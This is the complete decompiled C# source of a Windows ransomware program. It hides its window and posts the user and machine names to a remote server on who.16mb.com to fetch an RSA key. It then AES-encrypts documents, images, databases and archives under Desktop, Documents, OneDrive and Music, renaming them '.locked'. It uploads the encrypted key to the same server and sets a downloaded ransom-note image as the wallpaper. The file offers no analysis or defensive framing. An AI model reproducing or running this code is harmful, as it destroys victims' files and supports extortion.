using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Ea2;

public class Form1 : Form
{
	private static bool OAEP = false;

	private const int keySize = 2048;

	private string publicKey;

	private string encryptedPassword;

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\Users\\";

	private string generatorUrl = "http://who.16mb.com/ea2/createkeys.php";

	private string keySaveUrl = "http://who.16mb.com/ea2/savekey.php";

	private string backgroundImageUrl = "http://who.16mb.com/ea2/advise.jpg";

	private string aesPassword;

	private IContainer components = null;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public string getPublicKey(string url)
	{
		WebClient webClient = new WebClient();
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection["username"] = userName;
		nameValueCollection["pcname"] = computerName;
		byte[] bytes = webClient.UploadValues(url, "POST", nameValueCollection);
		string @string = Encoding.UTF8.GetString(bytes);
		webClient.Dispose();
		return @string;
	}

	public void sendKey(string url)
	{
		WebClient webClient = new WebClient();
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection["pcname"] = computerName;
		nameValueCollection["aesencrypted"] = encryptedPassword;
		webClient.UploadValues(url, "POST", nameValueCollection);
		webClient.Dispose();
	}

	public void startAction()
	{
		string text = "\\desktop\\";
		string location = userDir + userName + text;
		publicKey = getPublicKey(generatorUrl);
		string text2 = CreatePassword(32);
		encryptDirectory(location, text2);
		encryptedPassword = EncryptTextRSA(text2, 2048, publicKey);
		sendKey(keySaveUrl);
		text2 = null;
		encryptedPassword = null;
		text = null;
		text = "\\documents\\";
		location = userDir + userName + text;
		publicKey = getPublicKey(generatorUrl);
		text2 = CreatePassword(32);
		encryptDirectory(location, text2);
		encryptedPassword = EncryptTextRSA(text2, 2048, publicKey);
		sendKey(keySaveUrl);
		text2 = null;
		encryptedPassword = null;
		text = "\\onedrive\\";
		location = userDir + userName + text;
		publicKey = getPublicKey(generatorUrl);
		text2 = CreatePassword(32);
		encryptDirectory(location, text2);
		encryptedPassword = EncryptTextRSA(text2, 2048, publicKey);
		sendKey(keySaveUrl);
		text2 = null;
		encryptedPassword = null;
		text = "\\music\\";
		location = userDir + userName + text;
		publicKey = getPublicKey(generatorUrl);
		text2 = CreatePassword(32);
		encryptDirectory(location, text2);
		encryptedPassword = EncryptTextRSA(text2, 2048, publicKey);
		sendKey(keySaveUrl);
		text2 = null;
		encryptedPassword = null;
		string path = userDir + userName + "\\desktop\\AdViSE.jpg";
		SetWallpaperFromWeb(backgroundImageUrl, path);
		Application.Exit();
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".locked");
	}

	public void encryptDirectory(string location, string password)
	{
		string[] source = new string[26]
		{
			".html", ".adml", ".xml", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
			".odt", ".jpg", ".png", ".csv", ".lnk", ".mdb", ".idx", ".ods", ".zip", ".rar",
			".dat", ".key", ".db", ".sql", ".dbs", "jar"
		};
		string[] files = Directory.GetFiles(location);
		string[] directories = Directory.GetDirectories(location);
		for (int i = 0; i < files.Length; i++)
		{
			string extension = Path.GetExtension(files[i]);
			if (source.Contains(extension))
			{
				EncryptFile(files[i], password);
			}
		}
		for (int j = 0; j < directories.Length; j++)
		{
			encryptDirectory(directories[j], password);
		}
	}

	public static string EncryptTextRSA(string text, int keySize, string publicKeyXml)
	{
		byte[] inArray = RSAEncrypt(Encoding.UTF8.GetBytes(text), keySize, publicKeyXml);
		return Convert.ToBase64String(inArray);
	}

	public static byte[] RSAEncrypt(byte[] data, int keySize, string publicKeyXml)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(keySize);
		rSACryptoServiceProvider.FromXmlString(publicKeyXml);
		return rSACryptoServiceProvider.Encrypt(data, OAEP);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public static int GetInt(RNGCryptoServiceProvider rnd, int max)
	{
		byte[] array = new byte[4];
		int num;
		do
		{
			rnd.GetBytes(array);
			num = BitConverter.ToInt32(array, 0) & 0x7FFFFFFF;
		}
		while (num >= max * (int.MaxValue / max));
		return num % max;
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		using (RNGCryptoServiceProvider rnd = new RNGCryptoServiceProvider())
		{
			while (length-- > 0)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!="[GetInt(rnd, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!=".Length)]);
			}
		}
		return stringBuilder.ToString();
	}

	public void SetWallpaper(string path)
	{
		SystemParametersInfo(20u, 0u, path, 3u);
	}

	private void SetWallpaperFromWeb(string url, string path)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFile(new Uri(url), path);
		SetWallpaper(path);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 261));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
